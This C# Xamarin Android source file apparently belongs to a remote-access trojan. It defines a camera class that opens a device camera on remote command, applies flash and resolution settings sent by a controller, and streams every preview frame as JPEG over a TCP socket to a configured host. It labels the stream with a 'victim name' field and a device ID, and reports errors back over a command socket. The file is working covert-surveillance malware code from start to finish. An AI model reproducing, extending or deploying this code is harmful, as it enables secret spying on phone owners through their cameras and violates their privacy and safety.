using Android.Graphics;
using Android.Runtime;
using Android.Views;
using Java.Interop;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Task2
{
    class Prev : Java.Lang.Object, ISurfaceHolderCallback, Android.Hardware.Camera.IPreviewCallback
    {
        public Android.Hardware.Camera mCamera;
        public IntPtr Handle;

        public int JniIdentityHashCode;

        public JniObjectReference PeerReference;

        public JniPeerMembers JniPeerMembers;

        public JniManagedPeerStates JniManagedPeerState;
        ISurfaceHolder hldr;
        //public static Prev global_cam;

        private Socket camSock = default;
        public void Dispose()
        {

        }

        public void Disposed()
        {

        }

        public void DisposeUnlessReferenced()
        {

        }

        public void Finalized()
        {

        }
        string ID = "";
        public void OnPreviewFrame(byte[] data, Android.Hardware.Camera camera)
        {
            Bitmap capturedScreen = convertYuvByteArrayToBitmap(data, camera);
            if (capturedScreen != null)
            {
                using (capturedScreen)
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        capturedScreen.Compress(Bitmap.CompressFormat.Jpeg, int.Parse(MainValues.quality), ms);
                        byte[] live = ForegroundService._globalService.MyDataPacker("VID", ms.ToArray(), ID);
                        try
                        {
                            if (camSock != null)
                            {
                                camSock.Send(live, 0, live.Length, SocketFlags.None);
                                System.Threading.Tasks.Task.Delay(1).Wait();
                                System.Diagnostics.Debug.WriteLine("WEBCAM SENDING");
                            }
                        }
                        catch (Exception ex)
                        {
                            System.Diagnostics.Debug.WriteLine("WEBCAM " + ex.Message);
                        }
                    }
                }
            }
            else
            {
                System.Diagnostics.Debug.WriteLine("NULL YUV ARAY");
            }
        }
        public void SetJniIdentityHashCode(int value)
        {

        }

        public void SetJniManagedPeerState(JniManagedPeerStates value)
        {

        }

        public void SetPeerReference(JniObjectReference reference)
        {

        }

        public void SurfaceChanged(ISurfaceHolder holder, [GeneratedEnum] Format format, int width, int height)
        {

        }
        public void StartCamera(int camID, string flash, string resolution, string focuse)
        {
            //StopCamera();
            try { mCamera = Android.Hardware.Camera.Open(camID); }
            catch (Exception)
            {
                try
                {
                    byte[] dataPacker = ForegroundService._globalService.MyDataPacker("CAMNOT", System.
                            Text.Encoding.UTF8.GetBytes("OPENERR"));
                    ForegroundService.Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                }
                catch (Exception) { }
                return;
            }
            try
            {               
                ID = MainValues.KRBN_ISMI + "_" + ForegroundService._globalService.GetIdentifier();
                camSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                camSock.SendBufferSize = int.MaxValue;
                camSock.SendTimeout = -1;
                camSock.NoDelay = true;
                ForegroundService._globalService.SetKeepAlive(camSock, 2000, 1000);
                camSock.Connect(endpoint_dosya);
                byte[] ready = ForegroundService._globalService.MyDataPacker("MYVIDREADY", Encoding.UTF8.GetBytes("ECHO"), ID);
                camSock.Send(ready, 0, ready.Length, SocketFlags.None);
                Android.Hardware.Camera.Parameters params_ = mCamera.GetParameters();
                SetFlashModeOff(params_);
                if (flash == "1")
                {
                    FlashParam(params_);
                }
                ///
                params_.SetPreviewSize(int.Parse(resolution.Split('x')[0]),
                    int.Parse(resolution.Split('x')[1]));
                ///
                if (focuse == "1")
                {
                    SetFocusModeOn(params_);
                }
                ///       
                SetSceneModeAuto(params_);
                SetWhiteBalanceAuto(params_);
                try
                {
                    mCamera.SetParameters(params_);
                    mCamera.SetPreviewDisplay(hldr);
                    mCamera.SetPreviewCallback(this);
                    mCamera.StartPreview();
                }
                catch (Exception)
                {
                    try
                    {
                        byte[] senddata = ForegroundService._globalService.MyDataPacker("CAMNOT", Encoding.UTF8.GetBytes("PREVERR"));
                        ForegroundService.Soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                    StopCamera();
                }
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] senddata = ForegroundService._globalService.MyDataPacker("CAMNOT", Encoding.UTF8.GetBytes(ex.Message));
                    ForegroundService.Soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
                StopCamera();

            }
        }
        public void StopCamera()
        {
            if (mCamera != null)
            {
                try
                {
                    mCamera.StopPreview();
                    mCamera.SetPreviewDisplay(null);
                    mCamera.SetPreviewCallback(null);
                    mCamera.Lock();
                    mCamera.Release();
                    mCamera = null;
                    hldr.RemoveCallback(this);
                    ResetWindowManager();
                    ForegroundService._globalService.CamInService();
                }
                catch (Exception) { }
            }
            if (camSock != null)
            {
                try { camSock.Close(); } catch { }
                try { camSock.Dispose(); } catch { }
            }

        }
        private void ResetWindowManager()
        {
            //We must reset window manager, otherwise the camera not start camera preview in HUAWEI devices..
            if (ForegroundService._globalService.windowManager != null)
            {
                if (ForegroundService._globalService._globalSurface != null)
                {
                    ForegroundService._globalService.windowManager.RemoveView(ForegroundService._globalService._globalSurface);
                    ForegroundService._globalService._globalSurface.Dispose();
                }
                ForegroundService._globalService.windowManager.Dispose();
            }
        }
        public void SurfaceCreated(ISurfaceHolder holder)
        {
            hldr = holder;
        }
        public void SurfaceDestroyed(ISurfaceHolder holder)
        {

        }

        public void UnregisterFromRuntime()
        {

        }
        private Bitmap convertYuvByteArrayToBitmap(byte[] data, Android.Hardware.Camera camera)
        {
            try
            {
                Android.Hardware.Camera.Parameters parameters = camera.GetParameters();
                Android.Hardware.Camera.Size size = parameters.PreviewSize;
                using (YuvImage image = new YuvImage(data, parameters.PreviewFormat, size.Width, size.Height, null))
                {
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        image.CompressToJpeg(new Rect(0, 0, size.Width, size.Height), int.Parse(MainValues.quality), memoryStream);
                        return BitmapFactory.DecodeByteArray(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
        }
        private void FlashParam(Android.Hardware.Camera.Parameters prm)
        {
            IList<string> supportedFlashModes = prm.SupportedFlashModes;
            if (supportedFlashModes != null)
            {
                if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeTorch))
                {
                    prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeTorch;
                }
                else
                {
                    if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeRedEye))
                    {
                        prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeRedEye;
                    }
                    else
                    {
                        if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeOn))
                        {
                            prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOn;
                        }
                        else
                        {
                            if (supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeAuto))
                            {
                                prm.FlashMode = Android.Hardware.Camera.Parameters.FlashModeAuto;
                            }
                        }
                    }
                }
            }
        }
        private void SetFlashModeOff(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedFlashModes = oldParameters.SupportedFlashModes;

            if (supportedFlashModes != null &&
                supportedFlashModes.Contains(Android.Hardware.Camera.Parameters.FlashModeOff))
            {
                oldParameters.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOff;
            }
        }
        private void SetFocusModeOn(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedFocusModes = oldParameters.SupportedFocusModes;
            if (supportedFocusModes != null &&
                supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeContinuousVideo))
            {
                oldParameters.FocusMode = Android.Hardware.Camera.Parameters.FocusModeContinuousVideo;
            }
        }
        private void SetWhiteBalanceAuto(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedWhiteBalance = oldParameters.SupportedWhiteBalance;

            if (supportedWhiteBalance != null &&
                supportedWhiteBalance.Contains(Android.Hardware.Camera.Parameters.WhiteBalanceAuto))
            {
                oldParameters.WhiteBalance = Android.Hardware.Camera.Parameters.WhiteBalanceAuto;
            }

        }
        private void SetSceneModeAuto(Android.Hardware.Camera.Parameters oldParameters)
        {
            IList<string> supportedSceneModes = oldParameters.SupportedSceneModes;

            if (supportedSceneModes != null &&
                supportedSceneModes.Contains(Android.Hardware.Camera.Parameters.SceneModeAuto))
            {
                oldParameters.SceneMode = Android.Hardware.Camera.Parameters.SceneModeAuto;
            }
        }
    }
}